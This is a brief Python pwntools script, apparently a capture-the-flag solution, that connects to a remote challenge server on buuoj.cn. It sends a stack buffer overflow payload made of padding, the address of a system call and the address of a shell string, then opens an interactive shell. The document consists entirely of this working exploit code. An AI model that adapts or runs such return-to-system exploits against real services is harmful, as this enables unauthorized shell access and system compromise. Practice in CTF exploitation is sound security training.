from pwn import *

io = remote("node4.buuoj.cn", 29546)

sh = 0x08048670
call_system = 0x08048529

#attack
payload = b'M'*(0x18+4) + p32(call_system) + p32(sh)
io.recv()
io.sendline(payload)

io.interactive()